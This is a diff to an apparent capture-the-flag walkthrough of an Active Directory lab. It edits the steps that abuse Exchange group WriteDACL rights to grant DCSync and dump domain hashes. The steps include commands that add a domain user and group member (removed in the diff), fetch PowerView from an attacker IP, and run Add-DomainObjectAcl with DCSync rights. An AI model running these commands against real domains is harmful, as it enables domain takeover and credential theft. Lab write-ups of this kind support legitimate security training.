@@ -70,17 +70,8 @@ Look at the results using sharphound. Find an AS-REP Roastable account that is t
 Find a Kerberoastable account
 ![alt text](images/image-9.png)
 
-In Bloodhound, select the shortest path form owned principals and see the path to the account Operators. Find the Windows abuse tab after right clicking to help on the edge between `Account Operators` and `EXCH01 HTB.LOCAL`.
-![alt text](images/image-11.png)
-![alt text](images/image-10.png)
-
 The Exchange Windows Permissions Group has WriteDACL privileges on the domain, which means any member of the group can access the Discretionary Access Control List on the target domain and grant themselves any privileges on the object.  
 Create a new user in the domain group and add it to the "Exchange Windows Permissions" Group
-
-```
-net user bob password123 /add /domain
-net group "Exchange Windows Permissions" /add bob
-```
 
 ![alt text](images/image-12.png)
 ![alt text](images/image-14.png)
@@ -94,14 +85,14 @@ iwr -uri 'http://10.10.14.202/PowerView.ps1' -O PowerView.ps1
 Import-Module .\PowerView.ps1
 ```
 
-Then follow the instructions from Bloodhound. Add the PrincipalIdentity flag and include the identity in the expanded format.
+Then follow the instructions from Bloodhound. Add the PrincipalIdentity flag and include the full length naming context for the TargetIdentity Add-DomainObjectsAcl command.
 
 ```
 $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 
 $Cred = New-Object System.Management.Automation.PSCredential('HTB\bob', $SecPassword)
 
-Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity bob
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity bob -Rights DCSync
 ```
 
 Then use Secretsdump to get the Password dump  
